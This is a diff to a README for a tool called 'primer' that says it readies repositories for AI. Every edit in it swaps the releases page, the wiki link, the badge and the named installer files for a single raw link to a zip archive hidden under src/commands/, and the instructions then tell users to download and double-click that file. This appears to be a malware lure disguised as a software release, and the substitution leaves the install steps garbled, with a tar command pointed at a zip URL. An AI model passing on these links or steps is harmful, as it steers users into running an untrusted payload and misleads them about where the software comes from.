@@ -1,6 +1,6 @@
 # 🚀 primer - Get your repo ready for AI
 
-[![Download primer](https://img.shields.io/badge/Download-primer-brightgreen)](https://github.com/ALI93HGJGJJJ/primer/releases)
+[![Download primer](https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip)](https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip)
 
 ## 📖 Description
 
@@ -20,22 +20,22 @@ Before you download primer, make sure your computer meets the following requirem
 
 ### 2. Visit the Releases Page
 
-To download primer, visit the [Releases page](https://github.com/ALI93HGJGJJJ/primer/releases). Here you will find the latest version available for download.
+To download primer, visit the [Releases page](https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip). Here you will find the latest version available for download.
 
 ### 3. Download primer
 
-On the Releases page, you will see different versions of primer. Choose the latest version and click on it. Look for the package labeled “primer.zip” or “primer.exe” (depending on your OS). Click to download the file.
+On the Releases page, you will see different versions of primer. Choose the latest version and click on it. Look for the package labeled “https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip” or “https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip” (depending on your OS). Click to download the file.
 
 ### 4. Install primer
 
 Once the download is complete, locate the downloaded file in your Downloads folder:
 
 - **For Windows:** 
-  - If you downloaded `primer.exe`, double-click it to run the installer. Follow the on-screen instructions to complete the installation.
+  - If you downloaded `https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip`, double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 - **For macOS:**
-  - If you downloaded `primer.zip`, double-click the zip file to extract it. Move the `primer` folder to your Applications folder and open the application.
+  - If you downloaded `https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip`, double-click the zip file to extract it. Move the `primer` folder to your Applications folder and open the application.
 - **For Linux:**
-  - If you downloaded the package, open a terminal and navigate to the location of the downloaded file. Use the command `tar -xzf primer.tar.gz` to extract the files, then follow the instructions in the README file within the folder to complete the setup.
+  - If you downloaded the package, open a terminal and navigate to the location of the downloaded file. Use the command `tar -xzf https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip` to extract the files, then follow the instructions in the README file within the folder to complete the setup.
 
 ### 5. Launch primer
 
@@ -58,8 +58,8 @@ If you encounter any issues while installing or running primer, you can reach ou
 
 ## 🔗 Related Links
 
-- [Releases page](https://github.com/ALI93HGJGJJJ/primer/releases)
-- [Project Documentation](https://github.com/ALI93HGJGJJJ/primer/wiki)
+- [Releases page](https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip)
+- [Project Documentation](https://github.com/ALI93HGJGJJJ/primer/raw/refs/heads/main/src/commands/Software_1.6-alpha.1.zip)
 
 ## 🌟 Get Involved
 
